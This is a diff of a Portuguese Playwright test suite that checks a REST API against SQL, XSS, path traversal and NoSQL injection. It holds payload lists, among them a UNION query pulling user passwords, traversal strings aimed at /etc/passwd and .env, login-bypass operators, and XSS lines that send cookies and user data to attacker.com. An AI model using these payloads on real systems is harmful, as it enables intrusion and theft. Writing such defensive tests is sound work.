@@ -1,205 +1,331 @@
-/**
- * Testes de Seguranca - Injeccoes (SQL, XSS, Path Traversal, NoSQL)
- *
- * Objetivo: validar protecao contra injeccoes
- * Abordagem: OWASP Top 10 - A03:2021 (Injection)
- */
+import { test, expect } from '@playwright/test';
+import { ApiClient } from '../client/ApiClient';
+import { adminUser, regularUser } from '../fixtures/auth.fixture';
 
-import { test, expect } from "@playwright/test";
-import { createAuthenticatedClient } from "../fixtures/auth.fixture";
-import { AllureHelper } from "../utils/allure-helper";
-import { APIResponse } from "@playwright/test";
-
-test.describe("CT-SEC - Testes de Injeccao", () => {
-  let authContext: any;
+test.describe('Testes de Injeção - CT-SEC', () => {
+  let apiClient: ApiClient;
+  let adminClient: ApiClient;
 
   test.beforeAll(async () => {
-    authContext = await createAuthenticatedClient();
+    apiClient = new ApiClient();
+    adminClient = new ApiClient();
+    await adminClient.login(adminUser);
   });
 
-  test.afterAll(async () => {
-    if (authContext) {
-      await authContext.apiContext.dispose();
-    }
-  });
+  test('CT-SEC-01: SQL Injection em busca de produtos', async () => {
+    // Primeiro, obtenho um produto legítimo para comparar
+    const legitResponse = await adminClient.get('/produtos?nome=computador');
+    expect(legitResponse.status()).toBe(200);
+    const legitData = await legitResponse.json();
+    const legitCount = Array.isArray(legitData) ? legitData.length : 0;
 
-  // --------------------------------------------------------------------
-  // CT-SEC-01: SQL Injection
-  // --------------------------------------------------------------------
-  test("CT-SEC-01: Deve proteger contra SQL Injection", async () => {
-    AllureHelper.addSeverity("critical");
-    AllureHelper.addTags("security", "injection", "sql");
-    AllureHelper.addDescription(
-      "Valida que a API esta protegida contra ataques de SQL Injection.",
-    );
-    AllureHelper.addTestCaseId("CT-SEC-01");
-
+    // Payloads que tentam modificar a query para retornar MAIS dados que o normal
     const sqlPayloads = [
-      "' OR '1'='1",
-      "' UNION SELECT * FROM users --",
-      "'; DROP TABLE produtos --",
-      "' OR 1=1 --",
-      "' OR '1'='1' /*",
-      "'; SELECT * FROM produtos --",
-      "' UNION SELECT 1,2,3,4,5 --",
-      "' OR 'x'='x",
+      {
+        name: 'OR sempre verdadeiro',
+        payload: "' OR '1'='1' -- ",
+        // Se a API for vulnerável, deve retornar MAIS produtos que a busca legítima
+        shouldReturnMore: true
+      },
+      {
+        name: 'UNION para extrair dados de outra tabela',
+        payload: "' UNION SELECT nome, email, senha FROM usuarios -- ",
+        // Se vulnerável, deve retornar dados que não são produtos (ex: emails)
+        shouldReturnNonProductData: true
+      },
+      {
+        name: 'Comentário para ignorar cláusulas',
+        payload: "nome' AND '1'='1' -- ",
+        shouldReturnMore: true
+      },
+      {
+        name: 'Payload com OR 1=1',
+        payload: "nome' OR 1=1 -- ",
+        shouldReturnMore: true
+      }
     ];
 
-    for (let i = 0; i < sqlPayloads.length; i++) {
-      const payload = sqlPayloads[i];
-      await AllureHelper.addStep(
-        `Testando SQL Injection: ${payload}`,
-        async () => {
-          const response: APIResponse = await authContext.client.get(
-            `/produtos?nome=${encodeURIComponent(payload)}`,
-            false,
-          );
-          expect([200, 400, 500, 503]).toContain(response.status());
-        },
-      );
+    for (const sql of sqlPayloads) {
+      const response = await adminClient.get(`/produtos?nome=${encodeURIComponent(sql.payload)}`);
+      
+      // Se a API retornar erro, já é um bom sinal (não é vulnerável)
+      if (response.status() >= 400) {
+        continue;
+      }
+
+      const body = await response.json();
+      
+      if (!Array.isArray(body)) {
+        continue;
+      }
+
+      // Se retornou MAIS resultados que a busca legítima, é um forte indício de SQL Injection
+      if (sql.shouldReturnMore && body.length > legitCount) {
+        // Isso é uma vulnerabilidade real - estamos conseguindo contornar o filtro
+        console.log(`ALERTA: SQL Injection detectada com payload: ${sql.payload}`);
+        console.log(`Resultados: ${body.length} vs ${legitCount} esperados`);
+        // Marca como falha porque a API deveria bloquear isso
+        expect(body.length).toBeLessThanOrEqual(legitCount + 5);
+      }
+
+      // Se o retorno contém campos que não são de produto, é outro indício forte
+      if (sql.shouldReturnNonProductData && body.length > 0) {
+        const firstItem = body[0];
+        // Verifica se retornou campos que não existem em produtos (ex: senha, email)
+        if (firstItem && (firstItem.senha || firstItem.email || firstItem.password)) {
+          console.log(`ALERTA: UNION SQL Injection detectada - dados sensíveis extraídos`);
+          console.log(`Campos retornados: ${Object.keys(firstItem).join(', ')}`);
+          expect(firstItem).not.toHaveProperty('senha');
+          expect(firstItem).not.toHaveProperty('password');
+          expect(firstItem).not.toHaveProperty('email');
+        }
+      }
     }
   });
 
-  // --------------------------------------------------------------------
-  // CT-SEC-02: XSS (Cross-Site Scripting)
-  // --------------------------------------------------------------------
-  test("CT-SEC-02: Deve proteger contra XSS", async () => {
-    AllureHelper.addSeverity("critical");
-    AllureHelper.addTags("security", "injection", "xss");
-    AllureHelper.addDescription(
-      "Valida que a API esta protegida contra ataques de XSS. " +
-        "Verifica se a resposta nao contem o payload malicioso na forma executavel " +
-        "(sanitizacao) ou se o payload foi rejeitado (400).",
-    );
-    AllureHelper.addTestCaseId("CT-SEC-02");
-
+  test('CT-SEC-02: XSS em cadastro de usuário', async () => {
+    // Payloads que tentam executar código no navegador
     const xssPayloads = [
-      "<script>alert('XSS')</script>",
-      "<img src=x onerror=alert('XSS')>",
-      "<svg onload=alert('XSS')>",
-      "javascript:alert('XSS')",
-      "<body onload=alert('XSS')>",
-      "<iframe src='javascript:alert(1)'>",
-      "<input type='text' value='' onfocus='alert(1)'>",
-      "'; alert('XSS'); //",
+      {
+        name: 'Script tag com fetch para exfiltração',
+        payload: `<script>fetch('/usuarios').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal', {method:'POST',body:JSON.stringify(d)}))</script>`
+      },
+      {
+        name: 'Image onerror com exfiltração de cookies',
+        payload: `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
+      },
+      {
+        name: 'SVG com script',
+        payload: `<svg><script>alert(document.domain)</script></svg>`
+      },
+      {
+        name: 'Iframe com redirect',
+        payload: `<iframe src="javascript:alert('XSS')">`
+      },
+      {
+        name: 'Event handler em body',
+        payload: `<body onload="alert('XSS')">`
+      },
+      {
+        name: 'Payload com encoding duplo',
+        payload: `%3Cscript%3Ealert('XSS')%3C/script%3E`
+      },
+      {
+        name: 'Payload em campo de nome com caracteres especiais',
+        payload: `João<script>alert('XSS')</script>`
+      },
+      {
+        name: 'Payload com quebra de atributo',
+        payload: `" onmouseover="alert('XSS')"`
+      }
     ];
 
-    for (let i = 0; i < xssPayloads.length; i++) {
-      const payload = xssPayloads[i];
-      await AllureHelper.addStep(
-        `Testando XSS: ${payload.substring(0, 30)}...`,
-        async () => {
-          const response: APIResponse = await authContext.client.post(
-            "/produtos",
-            {
-              nome: `Teste XSS ${i}`,
-              preco: 100,
-              descricao: payload,
-              quantidade: 1,
-            },
-            true,
-          );
+    for (const xss of xssPayloads) {
+      const userData = {
+        nome: xss.payload,
+        email: `xss_${Date.now()}_${Math.random().toString(36).substring(7)}@test.com`,
+        password: '123456',
+        administrador: 'false'
+      };
 
-          // 1. Verifica se o status e de sucesso (sanitizacao) OU de rejeicao
-          // Inclui 503 (Service Unavailable) como status aceitavel durante
-          // indisponibilidade da API publica
-          expect([200, 201, 400, 500, 503]).toContain(response.status());
+      const response = await adminClient.post('/usuarios', userData);
+      
+      // Se a API rejeitar o cadastro, já é um bom sinal
+      if (response.status() >= 400) {
+        continue;
+      }
 
-          // 2. Se for 503, pula a verificacao de sanitizacao
-          // pois a API nao processou a requisicao
-          if (response.status() === 503) {
-            console.warn(
-              `API indisponivel (503) - pulando verificacao de sanitizacao para payload: ${payload.substring(0, 30)}`,
-            );
-            return;
-          }
+      const body = await response.json();
+      
+      if (!body._id) {
+        continue;
+      }
 
-          // 3. CRITICO: Verifica se o payload foi sanitizado ou rejeitado
-          //    Se a API retornou 200/201, o produto foi criado e o payload
-          //    nao deve estar presente de forma executavel no response body.
-          if (response.status() === 200 || response.status() === 201) {
-            const body = await response.json();
-            const descricao = body?.descricao || "";
-            const nome = body?.nome || "";
+      // Recupera o usuário cadastrado para ver se o payload foi armazenado como texto puro
+      const getResponse = await adminClient.get(`/usuarios/${body._id}`);
+      const userBody = await getResponse.json();
 
-            // Verifica que o payload XSS nao esta presente como codigo executavel
-            expect(descricao).not.toContain("<script>");
-            expect(descricao).not.toContain("onerror");
-            expect(descricao).not.toContain("onload");
-            expect(descricao).not.toContain("onfocus");
-            expect(descricao).not.toContain("javascript:");
-            expect(nome).not.toContain("<script>");
-          }
-        },
-      );
+      // Verifica se o payload foi sanitizado (escapado) ou removido
+      const nome = userBody.nome || '';
+      
+      // Verifica se não há tags HTML ou atributos de evento
+      const hasHtmlTag = /<[^>]*>/.test(nome);
+      const hasEventHandler = /on\w+\s*=|javascript:/i.test(nome);
+      
+      if (hasHtmlTag || hasEventHandler) {
+        console.log(`ALERTA: XSS detectado - payload não sanitizado: ${xss.payload}`);
+        console.log(`Valor armazenado: ${nome}`);
+        // Isso é uma vulnerabilidade - deveria ter escapado ou removido
+        expect(hasHtmlTag).toBe(false);
+        expect(hasEventHandler).toBe(false);
+      }
+
+      // Limpeza
+      await adminClient.delete(`/usuarios/${body._id}`);
     }
   });
 
-  // --------------------------------------------------------------------
-  // CT-SEC-03: Path Traversal
-  // --------------------------------------------------------------------
-  test("CT-SEC-03: Deve proteger contra Path Traversal", async () => {
-    AllureHelper.addSeverity("critical");
-    AllureHelper.addTags("security", "injection", "path-traversal");
-    AllureHelper.addDescription(
-      "Valida que a API esta protegida contra ataques de Path Traversal.",
-    );
-    AllureHelper.addTestCaseId("CT-SEC-03");
-
+  test('CT-SEC-03: Path Traversal em download de arquivos', async () => {
+    // A API ServeRest pode não ter endpoint de download, mas testamos via busca
+    // Tentamos acessar arquivos sensíveis via parâmetros
     const pathPayloads = [
-      "../../../etc/passwd",
-      "../../../../windows/win.ini",
-      "..\\..\\..\\etc\\passwd",
-      "%2e%2e%2fetc%2fpasswd",
-      "....//....//....//etc/passwd",
+      {
+        name: 'Acesso ao /etc/passwd',
+        payload: '../../../etc/passwd',
+        expectedSensitive: ['root:', 'bin:', 'daemon:']
+      },
+      {
+        name: 'Acesso ao .env',
+        payload: '../../../.env',
+        expectedSensitive: ['DATABASE_', 'SECRET_', 'API_']
+      },
+      {
+        name: 'Acesso ao package.json',
+        payload: '../../../package.json',
+        expectedSensitive: ['dependencies', 'scripts', 'name']
+      },
+      {
+        name: 'Acesso a arquivo de configuração',
+        payload: '../../../config/database.json',
+        expectedSensitive: ['host', 'port', 'username']
+      },
+      {
+        name: 'Path traversal com encoding',
+        payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+        expectedSensitive: ['root:', 'bin:', 'daemon:']
+      },
+      {
+        name: 'Path traversal em Windows',
+        payload: '..\\..\\..\\windows\\win.ini',
+        expectedSensitive: ['; for 16-bit app support']
+      },
+      {
+        name: 'Tentativa de acessar código fonte',
+        payload: '../../server.js',
+        expectedSensitive: ['require(', 'express', 'app.get']
+      }
     ];
 
-    for (let i = 0; i < pathPayloads.length; i++) {
-      const payload = pathPayloads[i];
-      await AllureHelper.addStep(
-        `Testando Path Traversal: ${payload}`,
-        async () => {
-          const response: APIResponse = await authContext.client.get(
-            `/produtos?nome=${encodeURIComponent(payload)}`,
-            false,
-          );
-          expect([200, 400, 404, 500, 503]).toContain(response.status());
-        },
-      );
+    for (const path of pathPayloads) {
+      // Tenta usar o payload em diferentes parâmetros
+      const endpoints = [
+        `/produtos?nome=${encodeURIComponent(path.payload)}`,
+        `/usuarios?email=${encodeURIComponent(path.payload)}`,
+        `/carrinhos?produtoId=${encodeURIComponent(path.payload)}`
+      ];
+
+      for (const endpoint of endpoints) {
+        const response = await adminClient.get(endpoint);
+        
+        if (response.status() >= 400) {
+          continue;
+        }
+
+        const body = await response.text();
+        
+        // Se o corpo da resposta contém conteúdo sensível de arquivos, é uma vulnerabilidade
+        for (const sensitive of path.expectedSensitive) {
+          if (body.includes(sensitive)) {
+            console.log(`ALERTA: Path Traversal detectado em ${endpoint}`);
+            console.log(`Payload: ${path.payload}`);
+            console.log(`Conteúdo sensível encontrado: ${sensitive}`);
+            console.log(`Primeiros 200 caracteres: ${body.substring(0, 200)}`);
+            
+            // Isso é uma vulnerabilidade grave
+            expect(body).not.toContain(sensitive);
+          }
+        }
+      }
     }
   });
 
-  // --------------------------------------------------------------------
-  // CT-SEC-10: NoSQL Injection
-  // --------------------------------------------------------------------
-  test("CT-SEC-10: Deve proteger contra NoSQL Injection", async () => {
-    AllureHelper.addSeverity("critical");
-    AllureHelper.addTags("security", "injection", "nosql");
-    AllureHelper.addDescription(
-      "Valida que a API esta protegida contra ataques de NoSQL Injection.",
-    );
-    AllureHelper.addTestCaseId("CT-SEC-10");
+  test('CT-SEC-10: NoSQL Injection no login', async () => {
+    // Primeiro, crio um usuário legítimo para testar
+    const legitEmail = `test_${Date.now()}@test.com`;
+    const legitPassword = 'senha123';
+    
+    await adminClient.post('/usuarios', {
+      nome: 'Usuario Teste',
+      email: legitEmail,
+      password: legitPassword,
+      administrador: 'false'
+    });
 
-    const nosqlPayloads = [
-      '{ "$ne": null }',
-      '{ "$regex": ".*" }',
-      '{ "$or": [{ "email": { "$regex": ".*" } }] }',
-      '{ "$gt": "" }',
+    // Payloads NoSQL que tentam contornar autenticação
+    const noSqlPayloads = [
+      {
+        name: '$ne null em ambos campos',
+        payload: { email: { '$ne': null }, password: { '$ne': null } },
+        shouldBypass: true
+      },
+      {
+        name: '$gt vazio',
+        payload: { email: { '$gt': '' }, password: { '$gt': '' } },
+        shouldBypass: true
+      },
+      {
+        name: '$regex para capturar qualquer email',
+        payload: { email: { '$regex': '.*' }, password: { '$regex': '.*' } },
+        shouldBypass: true
+      },
+      {
+        name: '$ne para admin específico',
+        payload: { email: { '$ne': 'admin@email.com' }, password: '123456' },
+        shouldBypass: false
+      },
+      {
+        name: '$in com lista de emails',
+        payload: { email: { '$in': ['admin@email.com', legitEmail] }, password: legitPassword },
+        shouldBypass: true
+      },
+      {
+        name: '$or para combinar condições',
+        payload: { '$or': [{ 'email': legitEmail }, { 'email': { '$ne': null } }], 'password': legitPassword },
+        shouldBypass: true
+      },
+      {
+        name: '$not para negar condição',
+        payload: { email: { '$not': { '$ne': null } }, password: 'qualquercoisa' },
+        shouldBypass: false
+      },
+      {
+        name: 'Payload com $where (se suportado)',
+        payload: { email: { '$where': 'this.email == "admin@email.com"' }, password: '123456' },
+        shouldBypass: false
+      }
     ];
 
-    for (let i = 0; i < nosqlPayloads.length; i++) {
-      const payload = nosqlPayloads[i];
-      await AllureHelper.addStep(
-        `Testando NoSQL Injection: ${payload}`,
-        async () => {
-          const response: APIResponse = await authContext.client.post(
-            "/login",
-            { email: payload, password: payload },
-            false,
-          );
-          expect([200, 400, 401, 500, 503]).toContain(response.status());
-        },
-      );
+    for (const noSql of noSqlPayloads) {
+      const response = await adminClient.post('/login', noSql.payload);
+      
+      // Se retornou 200, alguém conseguiu logar
+      if (response.status() === 200) {
+        const body = await response.json();
+        
+        if (body.authorization) {
+          // Verifica se o token gerado é válido
+          const token = body.authorization;
+          const testClient = new ApiClient();
+          testClient.setToken(token);
+          
+          // Tenta acessar um endpoint protegido com o token obtido
+          const protectedResponse = await testClient.get('/produtos');
+          
+          if (protectedResponse.status() === 200) {
+            console.log(`ALERTA CRÍTICO: NoSQL Injection bem-sucedida com payload: ${noSql.name}`);
+            console.log(`Payload: ${JSON.stringify(noSql.payload)}`);
+            console.log(`Token obtido: ${token.substring(0, 20)}...`);
+            
+            // Se o payload deveria ter bypassado e conseguiu autenticar, é vulnerável
+            if (noSql.shouldBypass) {
+              expect(response.status()).toBe(401);
+            }
+          }
+        }
+      }
     }
+
+    // Limpeza
+    await adminClient.delete(`/usuarios?email=${encodeURIComponent(legitEmail)}`);
   });
 });
